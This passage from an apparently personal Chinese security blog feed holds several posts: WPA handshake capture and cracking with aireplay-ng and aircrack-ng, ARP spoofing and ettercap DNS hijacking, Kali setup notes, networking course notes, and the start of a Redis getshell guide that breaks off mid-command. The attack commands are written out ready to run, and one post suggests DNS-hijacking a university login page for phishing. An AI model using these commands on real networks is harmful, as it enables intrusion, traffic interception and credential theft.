id="强制断连接">强制断连接</h3><p>这个时候只要去等待用户重连就ok了,不过我们也可以采用简单的方法,使用aireplay-ng的发信号工具,它给wifi发一个deauth(反认证包),让设备断开连接,之后它自然会重连,这个时候我们就可以抓到握手包了 终端命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a F0:B4:29:D2:3D:2A -c B0:E2:35:C4:29:BC wlan0mon</span><br></pre></td></tr></table></figure><p>参数解释:</p><blockquote><p>-0发起deauthentication攻击 -a指定bssid -c指定断开的设备</p></blockquote><p><img src="/images/2018/07/Screenshot-from-2018-07-06-00-02-17.png" alt="blacsheep" /> 如果成功的话,终端会显示一个WPA handshake: F0:B4:29:D2:3D:2A 抓完了就可以恢复网卡的监控模式了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure><h3 id="开始破解">开始破解</h3><p>破解wifi听的最多的,aircrack-ng</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure><p>参数解释:</p><blockquote><p>-a2表示wpa握手包 -b表示bssid -w指定字典文件 最后是抓的包</p></blockquote><p>等待破解完成,就会在中间显示KEY FOUND![wifi_pass_is_here] <img src="/images/2018/07/fix_final.png" alt="blacsheep" /> 参考链接:<a href="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/" title="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/">http://topspeedsnail.com/kali-linux-crack-wifi-wpa/</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_arp</title>
      <link href="/2018/07/05/ez-arp/"/>
      <url>/2018/07/05/ez-arp/</url>
      
        <content type="html"><![CDATA[<p>简单的arp,之前有用过,但是老是忘,就简单记录下吧,顺便为后面一篇文章的学习做铺垫</p><h3 id="arpspoof">arpspoof</h3><p>这个比较简单,payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.1.103 192.168.1.1</span><br></pre></td></tr></table></figure><p>这样在192.168.1.103更新arp表寻找192.168.1.1的mac地址的时候会被攻击机替换成攻击机的mac,如果攻击机不进行转发则目标就会断网</p><h3 id="ettercap">ettercap</h3><p>直接使用GUI就好了,虽然不用GUI也行,但是命令比较复杂,我反正是记不住,我选择GUI 首先要dns截击的话还得配一下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br><span class="line"># 这里我改成了</span><br><span class="line"># * A 192.168.1.104</span><br><span class="line"># * PTR 192.168.1.104</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G #进入gui界面</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-05-18-06-40.png" alt="blacsheep" /> 选择使用的网卡 <img src="/images/2018/07/Screenshot-from-2018-07-05-18-06-48.png" alt="blacsheep" /> 扫一下局域网ip <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-01.png" alt="blacsheep" /> 网关加入到target1,目标加到2 <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-14.png" alt="blacsheep" /> 选择sniff connection <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-22.png" alt="blacsheep" /> 然后plugins里面选dns <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-43.png" alt="blacsheep" /> 然后目标就被dns截击了 <img src="/images/2018/07/1-2.jpg" alt="blacsheep" /> 当然,抓目标的包也是可以的,看需求嘛. 这里用的是你电信息门户登录点...如果愿意花心思的话,可以选择把特定的你电的网站进行dns截击,然后自己搭一个站,实现类似功能,然后挂到某些公共场合钓鱼..</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali的一些基本配置</title>
      <link href="/2018/07/04/kali%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/07/04/kali%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>一些个人使用的配置吧,方便以后自己配</p><h3 id="tmux">tmux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Send prefix </span><br><span class="line">set-option -g prefix C-a </span><br><span class="line">unbind-key C-a </span><br><span class="line">bind-key C-a send-prefix </span><br><span class="line"></span><br><span class="line"># Use Alt-arrow keys to switch panes </span><br><span class="line">bind -n M-Left select-pane -L </span><br><span class="line">bind -n M-Right select-pane -R </span><br><span class="line">bind -n M-Up select-pane -U </span><br><span class="line">bind -n M-Down select-pane -D </span><br><span class="line"></span><br><span class="line"># Shift arrow to switch windows </span><br><span class="line">bind -n S-Left previous-window </span><br><span class="line">bind -n S-Right next-window </span><br><span class="line"></span><br><span class="line"># Mouse mode </span><br><span class="line">set -g mouse on </span><br><span class="line"></span><br><span class="line"># Set easier window split keys </span><br><span class="line">bind-key v split-window -h </span><br><span class="line">bind-key h split-window -v </span><br><span class="line"></span><br><span class="line"># Easy config reload </span><br><span class="line">bind-key r source-file ~/.tmux.conf \; display-message &quot;tmux.conf reloaded&quot;</span><br></pre></td></tr></table></figure><h3 id="vim">vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">syntax on           &quot; 语法高亮</span><br><span class="line">autocmd InsertLeave * se nocul  &quot; 用浅色高亮当前行</span><br><span class="line">autocmd InsertEnter * se cul    &quot; 用浅色高亮当前行</span><br><span class="line">set ruler           &quot; 显示标尺</span><br><span class="line">set showcmd         &quot; 输入的命令显示出来，看的清楚些</span><br><span class="line">&quot;自动保存</span><br><span class="line">set autowrite</span><br><span class="line">set ruler                   &quot; 打开状态栏标尺</span><br><span class="line">set cursorline              &quot; 突出显示当前行</span><br><span class="line">set magic                   &quot; 设置魔术</span><br><span class="line">set guioptions-=T           &quot; 隐藏工具栏</span><br><span class="line">set guioptions-=m           &quot; 隐藏菜单栏</span><br><span class="line">&quot; 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; 去掉输入错误的提示声音</span><br><span class="line">set noeb</span><br><span class="line">&quot; 在处理未保存或只读文件的时候，弹出确认</span><br><span class="line">set confirm</span><br><span class="line">&quot; 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line">&quot; Tab键的宽度</span><br><span class="line">set tabstop=4</span><br><span class="line">&quot; 统一缩进为4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">&quot; 不要用空格代替制表符</span><br><span class="line">set noexpandtab</span><br><span class="line">&quot; 在行和段开始处使用制表符</span><br><span class="line">set smarttab</span><br><span class="line">&quot; 显示行号</span><br><span class="line">set number</span><br><span class="line">&quot; 历史记录数</span><br><span class="line">set history=1000</span><br><span class="line">&quot;禁止生成临时文件</span><br><span class="line">set nobackup</span><br><span class="line">set noswapfile</span><br><span class="line">&quot;搜索忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line">&quot;搜索逐字符高亮</span><br><span class="line">set hlsearch</span><br><span class="line">set incsearch</span><br></pre></td></tr></table></figure><h3 id="sources.list">sources.list</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h3 id="装docker">装docker</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D;</span><br><span class="line">echo &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list;</span><br><span class="line">apt-get install apt-transport-https ca-certificates;</span><br><span class="line">apt-get update &amp;&amp; sudo apt-get install docker-engine;</span><br><span class="line">systemctl start docker;</span><br><span class="line">systemctl enable docker;</span><br><span class="line">systemctl status docker;</span><br><span class="line">exit;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="alias">alias</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 开蚁剑</span><br><span class="line">alias ant=&#x27;cd /home/blacsheep/Tools/antSword-1.3-dev;npm start&#x27;</span><br><span class="line"></span><br><span class="line"># 杀进程</span><br><span class="line">alias mykill=&#x27;read temp;ps -aux  grep -v grep  grep $temp  cut -c 9-15  xargs kill&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计网复习(链路层)</title>
      <link href="/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h2 id="五.数据链路层">五.数据链路层</h2><h3 id="概述">概述</h3><p><strong>目的</strong>:了解数据链路层服务和协议原理 <strong>包括</strong>: (1)差错检测和纠错 (2)共享广播信道:多路访问协议 (3)链路层寻址 (4)可靠传输,流量控制 <strong>简单的介绍</strong> <strong>术语</strong>: 节点:主机和路由器(包括网桥和交换机) 链路:沿通信路径连接的通信信道 <strong>帧</strong>:链路层协议交换的数据单元。封装网络层数据报</p><blockquote><p>数据链路层的职责: 将分组通过一个链路,从一个节点传到临近的另一个节点。</p></blockquote><p><strong>特点</strong>: 分组的传输在经过不同链路的时候可以用不同的协议来实现</p><blockquote><p>例如,最初是以太网,然后是帧中继,接着是802.11</p></blockquote><p>每个链路协议提供不同服务</p><blockquote><p>例如,可以在链路上提供或不提供可靠的传输</p></blockquote><h3 id="链路层服务">链路层服务</h3><p><strong>成帧</strong>: (1)把网络层的数据加头和尾封装成帧 (2)帧头中包括指明目的和源的"物理地址"(不同于IP地址) <strong>链路访问</strong>: (1)媒体访问控制协议(MAC) (2)共享媒体的多路访问 <strong>在邻接节点间的可靠传输</strong>: (1)无确认无连接 (2)无确认有连接 (3)有确认有连接 <strong>差错检测</strong>: 差错由信号衰减和噪声所引起 如果接受者检测到错误,那么发送者重传帧或者丢弃帧 <strong>纠错</strong>: 接收者检测和纠正错误,不需要发送者重传。</p><h3 id="多路访问协议mac协议">多路访问协议(MAC协议)</h3><p>分三类:</p><blockquote><p><strong>1.信道划分</strong> 把信道进行划分(TDMA,FDMA,CDMA),然后给节点分配专用的小片 <strong>2.随机访问</strong> 不划分信道,允许冲突,能够从冲突中"进行恢复" <strong>3.轮流</strong> 通过集中来调整共享访问从而避免冲突</p></blockquote><p>具体来看:</p><h4 id="信道划分">信道划分</h4><p><strong>TDMA</strong>:通过对信道进行时隙的划分,轮流访问信道。 个人理解TDMA是一种串行使用,对时间划分的话利用效率其实很低... <strong>FDMA</strong>:信道根据频段来进行划分,每个站点分配一个固定的频段,未被使用的频段空闲。 <strong>CDMA</strong>:每个节点分配一个唯一的编码,每个节点用其唯一的编码来对发送的数据进行编码,这样可以实现多个节点共存,信号可以叠加,可以同步传输而无冲突(如果编码正交化)</p><h4 id="随机访问">随机访问</h4><p>节点以满数据率发送数据包,节点之间没有协调者,当有2个或更多的发送节点的时候会发生冲突. 所以随机访问MAC协议还要求能够检测冲突并且能够从冲突中恢复(比如通过延时重传)。 随机访问MAC协议的实例:</p><ul><li>ALOHA</li><li>时隙ALOHA</li><li>CSMA,CSMA/CD,CSMA/CA</li></ul><p><strong>ALOHA(非时隙):</strong> 简单,不需要同步,帧一到达立即传输 但是t0发送的帧会和[t0-1,t0+1]的发送的其它帧冲突 后出现的帧会覆盖前面出现的,所以传输成功概率为 P=p(1-p)<sup>2(N-1)</sup> <strong>时隙ALOHA:</strong> 假设情况: 所有的帧大小相同;时间被划分称为相同大小的时隙;一个时隙等于传送一帧的时间;所有节点只有在一个时隙开始的时候才能传送;节点需要同步;如果一个时隙有多个节点同时传送,所有节点都可以检测到冲突 实现: 节点发送新帧的时候等下一个时隙开始 如果没有冲突,节点可以在下一个时隙发送新帧 如果有冲突,节点在随后的时隙以概率p重传,直到成功 优点:</p><blockquote><p>1.单个活跃节点满速率传送帧 2.高分散性,只用节点时隙同步 3.简单</p></blockquote><p>缺点:</p><blockquote><p>1.冲突,浪费时隙 2.空闲时隙 3.节点只有在传输数据包的时候才能检测到冲突</p></blockquote><p><img src="/images/2018/07/1-1.jpg" alt="blacsheep" /> <strong>CSMA</strong> 可以类比人类的不打断他人 即传送之前侦听,如果信道空闲则传输,否则延时传输</p><blockquote><p>冲突可能: 传播延时可能导致两个节点没侦听到其它节点的传送。当发生冲突的时候,整个数据包传送时间被浪费。冲突概率由距离和传播延时决定</p></blockquote><p><strong>CSMA/CD</strong> 基本思想: 当一个节点要发送数据的时候,先看是否有载波 如果没有,则发送数据,否则继续监听,一旦发现空闲就立刻传送数据。 如果发送中没有发生冲突,则传输成功,否则停止正常发送,转而发送一短暂的干扰信号强化冲突,让其他站点都知道出现了冲突。 p发送了干扰信号后，指数退避一随机时间,即假设该帧经过n次冲突后，适配器在{0,1,2,…,2<sup>m</sup>-1}中随机选取一个K值 ，其中m=min(n,10),然后等待K*512比特时间后,回到第2步</p><h4 id="轮转协议">轮转协议</h4><p>两者的折中,主节点轮流邀请从属节点来传送数据 控制方式:控制令牌从一个节点传到另外一个节点。</p><h3 id="交换局域网">交换局域网</h3><p>主要是arp协议</p><h4 id="arp协议">arp协议</h4><p>数据帧的传输是依赖于MAC地址的,但是A往B发包的时候,只知道IP地址 问题:从B的IP怎么知道B的mac地址 每个局域网上的IP都有arp表,arp表中有局域网上的IP/MAC的一一对应,当A知道B的IP,想发分组给B的时候,假设B的MAC不在A的arp表,那么A广播包含B的IP地址的ARP查询包,局域网的所有机器都可以收到ARP查询,当B收到查询的时候,回送一个有自己MAC的包给A,A缓存IP-to-MAC信息直到过期. 如果是对外网发包,那么过程如下 发送过程: 在路由器R中有两个ARP表，每个针对一个IP网络 (LAN) 在主机的路由表中发现路由器的IP：111.111.111.110 在主机的ARP表中发现MAC地址：E6-E9-00-17-BB4B 等 A创建一个分组，源地址为A，目的地址为B A使用ARP得到R的111.111.111.110的MAC地址 A创建一个链路层帧，该帧以R的MAC地址为目的地址 ，并包含 A-to-B的IP数据包 A的适配器发送帧,R的适配器收到帧 R从Ethernet帧中提取IP数据包,得知目的地址为B R使用 ARP得到B的MAC地址 R创建一个包含A-to-B的IP数据包的帧发送给B</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计网复习(网络层)</title>
      <link href="/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h3 id="概述">概述</h3><p><strong>网络层工作流程</strong> 将分组从发送方发到接收方 发送方将<strong>数据段</strong>包装成分组发出去 接收方将分组解出数据段然后给传输层 网络层协议在每台主机和路由器上 剩下的直接在具体内容里看吧</p><h3 id="虚电路和数据报网络">虚电路和数据报网络</h3><p>数据报网络在网络层提供无连接服务 虚电路网络是有连接服务 可以对比传输层的TCP和UDP,但是也有区别</p><ul><li>服务是主机到主机,提供给传输层(传输层是端到端,提供给应用进程的服务)</li><li>同一时间提供两种中的一种(传输层:提供TCP和UDP)</li><li>在端系统及网络核心实现(传输层是在端系统实现的)</li></ul><h4 id="虚电路网络">虚电路网络</h4><p>和普通的电话线路相似,性能可靠,源端到目的端 特点:</p><ul><li>数据传输前建立虚电路,传输完毕拆除虚电路</li><li>每个分组携带vc标识</li><li>从源到目的的路径上的每个路由器都要维护每个连接的状态信息</li><li>链路、路由器资源可能分配给vc</li></ul><h4 id="数据报网络">数据报网络</h4><p>对于端到端的连接没有状态信息维护,分组使用目的主机的地址进行转发,同一个源到目的主机分组可能走不同的路径 <img src="/images/2018/07/1.jpg" alt="blacsheep" /> 使用的是最长前缀匹配,不作过多说明</p><h3 id="路由器工作原理">路由器工作原理</h3><p>首先是路由器的两个主要功能:</p><ul><li>运行路由算法/协议(RIP,OSPF,BGP),管理控制平面</li><li>将分组从输入链路转发到适当的输出链路,转发数据平面</li></ul><p>路由器的结构如下图 <img src="/images/2018/07/2.jpg" alt="blacsheep" /> ####输入端口</p><ul><li>根据分组中的目的地址,在输入端口的缓存中查找转发表得出适当的输出端口</li><li>有硬件查找和线性搜索两种</li><li>目标:要求输入端口的处理速度超过线路的处理速度</li><li>排队:如果输入端口分组的到达速度快于转发速度,那么就会进行排队</li></ul><h4 id="交换结构">交换结构</h4><p>在输入端口的路由表已经找到了输出端口,后面就要依靠交换结构来将分组从输入端口转到输出端口了 交换结构有三种</p><ul><li>内存交换</li></ul><p>传统的计算机,交换在cpu的控制下完成的,分组被拷贝到内存 这种交换收到内存带宽的限制(每个分组经过两次总线)</p><ul><li>总线交换</li></ul><p>分组从输入端口缓存经过一根共享总线到达输出端口缓存,交换速率受到带宽限制</p><ul><li>互联网络交换</li></ul><p>克服了总线带宽的限制</p><h4 id="输出端口">输出端口</h4><ul><li>缓存</li></ul><p>当分组从交换结构达到的速率快于输出链路速率的时候就需要缓存</p><ul><li>调度原则</li></ul><p>先到先服务FCFS,加权公平排队WFQ 抛弃原则:弃尾,主动队列管理,随机早期检测 当分组从交换结构达到的速率过快,输出端口缓冲区溢出的时候则会造成分组的丢失</p><h3 id="网际协议">网际协议</h3><p>Internet网络层 <img src="/images/2018/07/3.jpg" alt="blacsheep" /></p><h4 id="ip数据报格式">IP数据报格式</h4><p>头部20字节,具体来看 <img src="/images/2018/07/4.jpg" alt="blacsheep" /></p><h4 id="分片和重组">分片和重组</h4><p>例题 <img src="/images/2018/07/5.jpg" alt="blacsheep" /> 每隔一个完整数据报偏移为1480/8=185,ID相同,除了最后一个数据报的fragflag为0其他的均为1,length为MTU</p><h4 id="ip寻址介绍">ip寻址:介绍</h4><p>IP地址:分配给主机或路由器接口的32bit的标识符 接口:主机/路由器和链路之间的边界</p><ul><li>路由器和主机都可以有多接口</li><li>每个接口有一个ip地址</li></ul><h5 id="子网">子网</h5><p>IP高位为子网部分 低位为主机部分 什么是一个子网?</p><ul><li>设备接口的IP有相同的网络部分</li><li>没有路由器的介入,物理上能够互相到达</li></ul><p>为了确定子网,分开主机和路由器的每个接口,从而产生了几个分离的网络岛,这些独立网络中的每一个叫做一个子网</p><h5 id="子网掩码">子网掩码</h5><p>和IP做AND运算,获得的结果相同则处于同一子网</p><h5 id="分类ip">分类ip</h5><figure><img src="/images/2018/07/6.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h5 id="cidr地址块">CIDR地址块</h5><p>格式:a.b.c.d/x</p><h5 id="dhcp">DHCP</h5><p>问:主机如何获得IP? windows:控制面板-&gt;网络-&gt;配置-&gt;tcp/ip-&gt;属性 unix:/etc/rc.config</p><ul><li>DHCP(动态主机配置协议)</li></ul><p>自动从一个DHCP服务器得到IP地址</p><blockquote><p>目标:</p><ul><li>允许主机在加入网络时从网络服务器动态得到IP地址</li><li>能够在使用时续借地址租用</li><li>允许重用地址</li><li>支持准备加入网络的移动用户</li></ul></blockquote><ul><li>DHCP概述 主机广播"DHCP discover" DHCP回复"DHCP offer" 主机请求 "DHCP request" DHCP发送地址"DHCP ack"</li></ul><h5 id="nat">NAT</h5><p>动机:对外部网络来讲,本地网络只用一个IP地址:</p><ul><li><p>不需要从ISP分配一系列IP,只要一个IP地址用于所有设备</p></li><li><p>本地网络改变设备的IP不需要通知外界</p></li><li><p>可以变更ISP而不用改变本地网络的设备的地址</p></li><li><p>本地网络内部不能被外界寻址(对外界不可见)</p></li></ul><p><strong>执行</strong> 对于NAT路由器</p><ul><li><p>对于外出的分组,替换每个外出分组的(源ip,端口)为(NAT IP,新端口),远程服务器用(NAT IP,新端口)作为目的地来响应</p></li><li><p>NAT转换表中,每个(源IP,端口)到(NAT IP，新端口)转换配对</p></li><li><p>进来的分组:对每个进来的分组,用保存在NAT表中的(源IP 端口)来替换目的域(NAT IP,新端口)</p></li></ul><p>也就是用NATIP来做外访问外网的媒介,示意图如下 <img src="/images/2018/07/nat.png" alt="blacsheep" /></p><h5 id="icmp">ICMP</h5><p>用于主机路由器之间彼此交流网络层信息 - 差错报告:不可到达的主机,端口,协议</p><ul><li>请求/应答</li></ul><p>位于IP之上 - ICMP消息装载在IP分组里 ICMP的类型 <img src="/images/2018/07/icmperr.png" alt="blacsheep" /></p><h5 id="ipv6">ipv6</h5><p>初始动机:32-bit地址空间即将用尽 其他动机:改变格式可以帮助转发 IPv6数据报格式</p><ul><li><p>固定长度的40字节首部</p></li><li><p>不允许分片</p></li></ul><p><strong>ipv6和ipv4的不同</strong>:</p><ul><li><p>校验和:全部去掉,减少每一跳的处理时间</p></li><li><p>选项:允许,但是不是标准首部的一部分,而是用下一个首部域指出</p></li><li><p>ICMPv6:新版本的ICMP，增加了消息类型,比如分组太大,多波组管理功能</p></li></ul><p><strong>ipv4到ipv6的过渡</strong> 两种推荐方法:</p><ul><li>双栈:一些路由器具有双重栈能够在两种格式中转换</li></ul><p>即ipv6和ipv4之间转换</p><ul><li>隧道:穿过ipv4路由器的时候,ipv6作为分组负载</li></ul><p>用ipv4包住ipv6</p><h3 id="选路算法">选路算法</h3><p>选路算法决定了路由器中转发表中的值 路由算法可以简单的分个类 比如<strong>全局或是分散</strong> <strong>全局</strong> 所有的路由器都有完整的网络拓扑结构和链路开销 使用链路状态算法(如dijkstra) <strong>分散</strong> 路由器只知道物理连接的邻居和到邻居的链路开销 通过邻居之间的反复计算处理和交换信息来构造路由表 使用距离矢量算法 或者是<strong>静态和动态的</strong> <strong>静态的</strong> 路由变化很慢，通常有人工设定 <strong>动态的</strong> 路由变化很快,周期性更新,而且直接影响链路开销的变化</p><h4 id="链路状态算法">链路状态算法</h4><p>也就是dijkstra算法 所有节点知道网络拓扑结构和链路开销(通过链路状态广播完成)</p><h4 id="距离向量算法">距离向量算法</h4><p>动态计算 d<sub>x</sub>(y)=min<sub>v</sub>{c(x,y)+d<sub>v</sub>(y)} 方程举例: <img src="/images/2018/07/belman.png" alt="blacsheep" /> <strong>基本思想</strong></p><ul><li><p>每个节点周期性地给相邻节点发送自己的距离向量估计值</p></li><li><p>当节点x从它的任何一个邻居v收到一个新的距离向量估计值,就用B-F方程更新自己的距离向量估值</p></li></ul><p>简单正常情况下,距离向量估值D<sub>x</sub>(y)收敛到实际的最小路径开销d<sub>x</sub>(y)</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis在渗透测试中的利用总结</title>
      <link href="/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"/>
      <url>/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>之前做杭电的hgame的时候有一道ssrf打sql的题,当时找资料的时候倒是很多ssrf打redis的东西,这次学习一下吧,顺便总结一下</p><h2 id="概述">概述</h2><p>首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了 几种简单的方法</p><blockquote><p>1.通过向web目录写webshell来getshell 2.写ssh-key来getshell 3.写crontab来getshell</p></blockquote><p>当然,这些攻击都包含一些要求,比如当前用户的权限,目录权限,web目录是否已知等,怎么利用还是看具体场合</p><h2 id="redis服务器搭建">redis服务器搭建</h2><p><strong>第1步：redis服务的下载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure><p><strong>第2步：redis解压、编译</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><strong>第3步：启动redis服务</strong> 新版本的redis默认监听本地,我们可以改成0.0.0.0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure><p>然后启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /root/redis-4.0.9/redis.conf</span><br></pre></td></tr></table></figure><h2 id="攻击">攻击</h2><p>首先都是用redis客户端连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.182.128 -p 6379</span><br></pre></td></tr></table></figure><h3 id="crontabs攻击"><strong>crontabs攻击</strong></h3><p><strong>1.设置文件夹路径</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir 